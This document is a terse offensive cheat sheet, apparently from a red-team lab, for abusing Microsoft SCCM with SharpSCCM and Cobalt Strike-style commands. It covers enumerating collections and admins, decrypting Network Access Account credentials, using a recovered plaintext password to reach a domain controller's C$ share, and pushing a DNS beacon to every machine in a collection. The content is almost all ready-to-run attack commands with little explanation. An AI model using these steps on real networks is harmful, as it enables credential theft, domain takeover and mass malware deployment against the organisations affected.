# Enumeration

```bash
# Getting manager point
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner
#or
powershell Get-WmiObject -Class SMS_Authority -Namespace root\CCM | select Name, CurrentManagementPoint | fl

# Finding machines with privileges
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get site-info -d cyberbotic.io --no-banner

# Get collections (This can widely vary based on the current user)
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner

# Get members of collection
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collection-members -n DEV --no-banner

# Find administrative users
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get class-instances SMS_Admin --no-banner

# Get info about specific machines
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner

# Check where specific user was last logged in
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -u nlamb -p IPAddresses -p IPSubnets -p Name --no-banner
```

---

# Recovering plain text credentials (requires nt authority or admin)

```bash
# Decrypt credentials
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner

# Make token with credentials if found
make_token cyberbotic.io\sccm_svc Cyberb0tic
ls \\dc-1.cyberbotic.io\c$
```

---

# Lateral movement

```bash
# Create an application using notepad on every user withing the group
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner

# Make every machine run a dns beacon
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner
```
